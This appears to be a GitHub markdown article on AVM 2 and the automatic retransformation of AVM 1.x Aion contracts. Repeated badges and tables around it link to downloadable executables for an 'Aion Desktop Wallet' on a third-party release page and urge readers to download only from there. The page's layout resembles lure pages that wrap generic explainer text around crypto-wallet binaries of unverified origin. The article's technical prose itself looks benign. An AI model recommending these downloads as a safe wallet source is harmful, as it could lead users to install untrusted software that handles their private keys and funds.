![Aion Wallet](assets/banner-article.png)

# AVM 2 and Aion contracts: what changes

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

AVM 2 is not consensus-compatible with AVM 1.x, and contracts deployed on AVM 1.x are retransformed for AVM 2 automatically on their first transaction invocation, so an existing contract is not lost when the virtual machine version changes.

That last clause is the one people miss. "Not compatible" sounds like a break, and the release note describes a migration that happens without the contract owner doing anything.

## You'll see this if

- You deployed a contract against AVM 1.x and are wondering what happens now.
- You are reading the AVM 2 release note and the word "incompatible" stopped you.
- You are starting a new contract and choosing a target version.
- A contract call behaved differently after a network upgrade.

## What the release note says

The published note states two things in one breath: AVM 2.x is not consensus-compatible with AVM 1.x, and contracts deployed on AVM 1.x will be retransformed for AVM 2 upon their first transaction invocation.

The first half is about consensus: nodes running different virtual machine versions cannot agree on execution, which is why the upgrade is a network event rather than a library update.

The second half is about your contract: it is converted when it is first called, not when the network upgrades. Until that first call, the contract sits as it was.

## What retransformation means for a contract owner

Your address does not change. Your stored state does not move. What changes is the bytecode the network executes when the contract is invoked.

The practical consequence is that the first call after the upgrade is the moment to watch. If the contract behaves as before, the retransformation worked; if it fails, that call is where you learn it.

Test on a local chain against the new version before relying on a production contract. A local deployment with the same source and the same inputs is the closest thing to a rehearsal available.

## What it means for a new contract

Target AVM 2 if you are deploying now. A contract written for a virtual machine version the network no longer executes is a contract that will be retransformed before it runs, and it is better to build against the current target than to rely on conversion.

The language did not change. Contracts are still Java, compiled to Java bytecode with deterministic restrictions, as described in the [Aion Java smart contract](https://github.com/aion-wallet/aion-explained/blob/main/aion-java-smart-contract.md) article.

## What can go wrong

A contract that depends on behaviour the newer virtual machine defines differently can fail on its first call. That is not data loss; it is an execution difference, and it is why the rehearsal matters.

A contract that has never been called since the upgrade has not been retransformed yet. If it matters, call it deliberately rather than discovering the state during an urgent transaction.

Tooling built for AVM 1.x may not produce bytecode the current network accepts. Compile against the version you are deploying to.

## Checking a deployment

Record the virtual machine version alongside the contract address and the deployment transaction. Without the version, a later failure cannot be attributed to the upgrade or to the contract.

If a call fails after the upgrade, compare the same call against a local deployment on the new version before assuming the contract is broken. The difference between "the network changed" and "the contract was wrong" is exactly what that comparison shows.

A deployment is also a transaction on a specific network, so the client has to be pointed at mainnet before anything is sent. The [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) guide lists the identifiers, and the [what is Aion](https://github.com/aion-wallet/aion-explained/blob/main/what-is-aion.md) article explains the execution model the virtual machine belongs to.

## Prevention

Pin the virtual machine version in your build, and record it with the address.

Call long-lived contracts once after a network upgrade, on purpose, rather than waiting for a user to trigger the retransformation.

Keep the source and the build configuration. A contract that cannot be rebuilt is a contract that cannot be debugged.

## The upgrade in practice

Consensus upgrades are coordinated rather than optional: nodes running the older virtual machine and nodes running the newer one cannot agree on execution, so the network moves together. That is why the release note leads with compatibility rather than with features.

For a contract owner, the work is small but specific. Rehearse on a local chain with the new version, call the production contract once after the upgrade so the retransformation happens under supervision, and keep the transaction hash of that call.

For a developer starting now, the same knowledge applies in reverse: build against the current version, since a contract compiled for an older target will be converted before it runs, as the [Aion Java smart contract](https://github.com/aion-wallet/aion-explained/blob/main/aion-java-smart-contract.md) article describes.

## Frequently asked questions

### Are AVM 1.x contracts broken by AVM 2?

They are retransformed automatically on first invocation, which is a migration rather than a break. Whether the behaviour is identical depends on the contract.

### Do I need to redeploy?

No. The address stays and the state stays; what changes is the bytecode executed on invocation.

### Is AVM 2 backwards compatible with AVM 1.x?

The release note states it is not consensus-compatible with AVM 1.x. The automatic retransformation is what bridges existing deployments.

### Which version should a new contract target?

AVM 2, unless a specific dependency requires otherwise.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Aion Java smart contract](https://github.com/aion-wallet/aion-explained/blob/main/aion-java-smart-contract.md) - the language and the deployment shape.
- [What is Aion](https://github.com/aion-wallet/aion-explained/blob/main/what-is-aion.md) - the network and its virtual machine.
- [Aion chain ID and RPC](https://github.com/aion-wallet/aion-explained/blob/main/aion-chain-id-rpc.md) - the client side of a deployment.
- [Is Aion still active](https://github.com/aion-wallet/aion-explained/blob/main/is-aion-still-active.md) - what the release history shows.
